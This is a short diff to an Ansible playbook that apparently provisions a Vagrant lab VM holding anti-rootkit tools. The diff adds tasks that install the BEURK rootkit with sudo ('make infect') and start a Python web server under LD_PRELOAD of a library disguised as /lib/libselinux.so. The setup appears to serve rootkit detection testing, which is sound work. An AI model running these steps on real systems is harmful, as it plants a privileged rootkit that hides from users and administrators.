@@ -108,3 +108,13 @@
            dest={{ item.value.dest }}
            version={{ item.value.version }}
       with_dict: antirootkits
+
+    - name: Infect the system
+      shell: make infect chdir=/home/vagrant/project/beurk
+      tags: infect
+      sudo: yes
+
+    - name: Launch BEURK server
+      shell: LD_PRELOAD=/lib/libselinux.so python -m SimpleHTTPServer 3005 &
+             chdir=/home/vagrant/project/beurk
+      tags: infect
